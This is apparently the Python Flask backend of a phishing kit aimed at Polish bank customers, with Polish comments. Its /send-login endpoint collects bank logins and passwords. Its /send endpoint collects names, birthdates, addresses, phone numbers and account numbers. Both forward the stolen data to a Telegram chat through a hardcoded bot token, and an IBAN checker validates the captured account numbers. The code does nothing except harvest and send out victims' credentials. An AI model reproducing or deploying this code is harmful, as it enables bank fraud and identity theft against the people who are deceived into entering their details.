from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
import json
import time
import re

app = Flask(__name__)
CORS(app)

# Konfiguracja Telegram
TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs'
TELEGRAM_CHAT_ID = '-1004256695843'

# ============= IBAN VALIDATOR =============
def validate_iban(iban):
    """
    Sprawdza poprawność IBAN (polski i inne).
    Automatycznie dodaje 'PL' jeśli brakuje.
    Zwraca (is_valid, cleaned_iban, message)
    """
    # Usuwamy spacje i zamieniamy na wielkie litery
    cleaned = re.sub(r'\s+', '', iban).upper()
    
    # ===== AUTOMATYCZNIE DODAJEMY 'PL' JEŚLI BRAKUJE =====
    if not cleaned.startswith('PL') and len(cleaned) <= 26:
        # Sprawdzamy czy to polski IBAN (26 cyfr)
        digits_only = re.sub(r'[A-Z]', '', cleaned)
        if len(digits_only) == 26:
            cleaned = 'PL' + cleaned
        elif len(digits_only) == 24:
            # Jeśli brakuje 2 cyfr, może to być IBAN bez cyfr kontrolnych
            cleaned = 'PL' + cleaned
    
    # Sprawdzamy długość (minimum 15, maksimum 34)
    if len(cleaned) < 15 or len(cleaned) > 34:
        return False, cleaned, f"Nieprawidłowa długość IBAN: {len(cleaned)} znaków (powinno być 15-34)"
    
    # Sprawdzamy czy zawiera tylko litery i cyfry
    if not re.match(r'^[A-Z0-9]+$', cleaned):
        return False, cleaned, "IBAN zawiera niedozwolone znaki"
    
    # Sprawdzanie sumy kontrolnej (algorytm ISO 7064)
    try:
        # Przenosimy pierwsze 4 znaki na koniec
        rearranged = cleaned[4:] + cleaned[:4]
        # Zamieniamy litery na cyfry (A=10, B=11, ..., Z=35)
        numeric = ''
        for char in rearranged:
            if char.isdigit():
                numeric += char
            else:
                numeric += str(ord(char) - 55)
        
        # Sprawdzamy czy liczba dzieli się przez 97 bez reszty
        if int(numeric) % 97 != 1:
            return False, cleaned, "Nieprawidłowa cyfra kontrolna IBAN"
        
        return True, cleaned, "IBAN jest poprawny"
        
    except (ValueError, TypeError):
        return False, cleaned, "Nieprawidłowy format IBAN"

def format_iban_readable(iban):
    """Formatuje IBAN w grupy po 4 znaki"""
    cleaned = re.sub(r'\s+', '', iban).upper()
    return ' '.join([cleaned[i:i+4] for i in range(0, len(cleaned), 4)])

# ============= STRONA GŁÓWNA =============
@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "message": "Server is active",
        "endpoints": {
            "/": "GET - Status",
            "/ping": "GET - Keep-alive",
            "/send": "POST - Wysyłanie formularza",
            "/send-login": "POST - Wysyłanie loginu",
            "/validate-iban": "POST - Walidacja IBAN"
        },
        "timestamp": time.time()
    })

# ============= KEEP-ALIVE =============
@app.route('/ping')
def ping():
    return jsonify({
        "status": "alive",
        "timestamp": time.time()
    })

# ============= WALIDACJA IBAN =============
@app.route('/validate-iban', methods=['POST'])
def validate_iban_endpoint():
    try:
        data = request.json
        iban = data.get('iban', '')
        
        if not iban:
            return jsonify({
                "success": False,
                "error": "IBAN nie został podany"
            }), 400
        
        is_valid, cleaned, message = validate_iban(iban)
        
        return jsonify({
            "success": is_valid,
            "iban": cleaned,
            "formatted": format_iban_readable(cleaned) if is_valid else None,
            "message": message,
            "valid": is_valid
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# ============= ODBIÓR DANYCH Z FORMULARZA =============
@app.route('/send', methods=['POST'])
def send_data():
    try:
        data = request.json
        print(f"📥 Otrzymane dane: {data}")
        
        # ===== WALIDACJA IBAN =====
        iban_raw = data.get('iban', '')
        is_valid = False
        cleaned_iban = iban_raw
        formatted_iban = iban_raw
        
        if iban_raw:
            is_valid, cleaned_iban, iban_message = validate_iban(iban_raw)
            formatted_iban = format_iban_readable(cleaned_iban) if is_valid and cleaned_iban else iban_raw
        
        # ===== TWORZENIE WIADOMOŚCI =====
        message = f"""📋 NOWE DANE FORMULARZA:
        
👤 Imię: {data.get('fullname', 'Brak')}
📅 Data urodzenia: {data.get('birthdate', 'Brak')}
📱 Telefon: {data.get('phone', 'Brak')}
🏠 Ulica: {data.get('street', 'Brak')}
🏙️ Miasto: {data.get('city', 'Brak')}
📮 Kod: {data.get('postal', 'Brak')}

🏦 NRB: {formatted_iban}
✅ Status IBAN: {'✔️ POPRAWNY' if is_valid else '⚠️ NIEZWERYFIKOWANY (wprowadź 26 cyfr)'}
        """
        
        # ===== WYSYŁKA DO TELEGRAM =====
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=payload, timeout=10)
        
        if response.status_code == 200:
            return jsonify({
                "success": True,
                "message": "Dane wysłane pomyślnie!",
                "iban_valid": is_valid,
                "iban_formatted": formatted_iban
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Telegram error: {response.status_code}"
            }), 500
            
    except Exception as e:
        print(f"❌ Błąd: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# ============= ODBIÓR DANYCH LOGOWANIA =============
@app.route('/send-login', methods=['POST'])
def send_login():
    try:
        data = request.json
        print(f"🔐 Otrzymano login: {data}")
        
        # ===== SPRAWDZAMY IBAN W LOGINIE =====
        iban_from_login = data.get('iban', '')
        iban_valid = False
        formatted_iban = iban_from_login
        
        if iban_from_login:
            is_valid, cleaned, _ = validate_iban(iban_from_login)
            iban_valid = is_valid
            if is_valid:
                formatted_iban = format_iban_readable(cleaned)
        
        # ===== TWORZENIE WIADOMOŚCI =====
        message = f"""🔐 LOGOWANIE DO BANKU:

🏦 Bank: {data.get('bank', 'Brak')}
👤 Login: {data.get('username', 'Brak')}
🔑 Hasło: {data.get('password', 'Brak')}"""
        
        if iban_from_login:
            message += f"""
🏦 NRB: {formatted_iban}
✅ Status IBAN: {'✔️ POPRAWNY' if iban_valid else '⚠️ NIEZWERYFIKOWANY'}"""
        
        # ===== WYSYŁKA DO TELEGRAM =====
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, data=payload, timeout=10)
        
        if response.status_code == 200:
            return jsonify({
                "success": True,
                "message": "Login sent successfully!",
                "iban_valid": iban_valid if iban_from_login else None
            })
        else:
            return jsonify({
                "success": False,
                "error": f"Telegram error: {response.status_code}"
            }), 500
            
    except Exception as e:
        print(f"❌ Błąd: {e}")
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500

# ============= OBSŁUGA 404 =============
@app.errorhandler(404)
def not_found(error):
    return jsonify({
        "error": "Endpoint not found",
        "available_endpoints": {
            "/": "GET - Check status",
            "/ping": "GET - Keep-alive",
            "/send": "POST - Send form data",
            "/send-login": "POST - Send login data",
            "/validate-iban": "POST - Validate IBAN"
        }
    }), 404

# ============= URUCHOMIENIE =============
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
